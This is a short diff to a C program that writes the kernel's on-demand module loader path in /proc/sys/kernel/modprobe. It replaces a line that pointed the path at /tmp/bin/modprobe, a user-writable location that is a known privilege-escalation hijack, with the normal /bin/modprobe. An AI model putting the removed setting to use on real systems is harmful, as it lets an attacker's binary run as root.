@@ -54,7 +54,7 @@ int main(void) {
     /* the kernel loads modules on demand through this path */
     fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
     if (fd >= 0) {
-        if (write(fd, "/tmp/bin/modprobe\n", 18) < 0) msg("cannot set", "modprobe path", errno);
+        if (write(fd, "/bin/modprobe\n", 14) < 0) msg("cannot set", "modprobe path", errno);
         close(fd);
     }
 
